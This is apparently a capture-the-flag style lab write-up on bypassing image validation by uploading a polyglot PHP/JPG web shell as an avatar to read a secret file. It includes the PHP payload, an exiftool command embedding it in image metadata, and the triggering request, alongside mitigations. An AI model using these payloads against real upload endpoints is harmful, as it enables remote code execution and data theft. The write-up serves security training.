# Lab Name
Web shell upload via polyglot file

## Vulnerability
Unrestricted File Upload – Polyglot File Upload Leading to Remote Code Execution (RCE)

## Objective
Create a polyglot PHP/JPG file containing a PHP payload inside the image metadata, upload it as an avatar, execute the embedded PHP code, retrieve Carlos's secret, and solve the lab.

## Entry Point
Avatar Upload functionality

## Exploitation Type
Unrestricted File Upload / Polyglot File Upload / Remote Code Execution (RCE)

## Methodology
1. On your local machine, create a file named **exploit.php** containing the following PHP code:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

2. Open Burp's browser and log in using the provided user credentials.

3. Attempt to upload **exploit.php** as your avatar.

4. Observe that the application blocks the upload because the file is not a valid image, even if previous bypass techniques are used.

5. Create a **polyglot PHP/JPG** file by embedding a PHP payload inside the metadata of a legitimate JPG image using **ExifTool**.

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

6. This command inserts the PHP payload into the image's **Comment** metadata while saving the image with a **.php** extension.

7. Upload **polyglot.php** using the avatar upload functionality.

8. Return to the **My Account** page after the upload completes successfully.

9. In **Burp Suite**, go to **Proxy > HTTP History** and locate the following request:

```http
GET /files/avatars/polyglot.php HTTP/1.1
```

10. Open the response in Burp.

11. Use the message editor's **Search** feature and search for:

```text
START
```

12. Observe that the response contains the following output inside the binary image data:

```text
START <Carlos's Secret> END
```

13. Copy Carlos's secret.

14. Submit the secret to complete the lab.

## Payload Used

### PHP Payload

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### ExifTool Command

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

### Request

```http
GET /files/avatars/polyglot.php HTTP/1.1
```

## Result
Successfully created a polyglot PHP/JPG file, bypassed the application's image validation, executed the embedded PHP code, retrieved Carlos's secret, and solved the lab.

## Impact
- Remote Code Execution (RCE)
- File Upload Restriction Bypass
- Arbitrary Code Execution
- Sensitive File Disclosure
- Complete Server Compromise

## Mitigation
- Validate uploaded files using both file signatures and strict content inspection.
- Re-encode uploaded images to remove embedded metadata before storing them.
- Store uploaded files outside the web root.
- Disable execution of uploaded files.
- Reject executable file extensions regardless of file content.
- Scan uploaded files for embedded server-side code before processing.

## Learning
This vulnerability demonstrates that validating only the image structure is insufficient. By embedding PHP code inside the metadata of a legitimate JPG image, an attacker can create a **polyglot** file that is simultaneously a valid image and a valid PHP script. If the server executes uploaded PHP files without stripping metadata or re-encoding the image, the embedded PHP code is executed, resulting in Remote Code Execution.
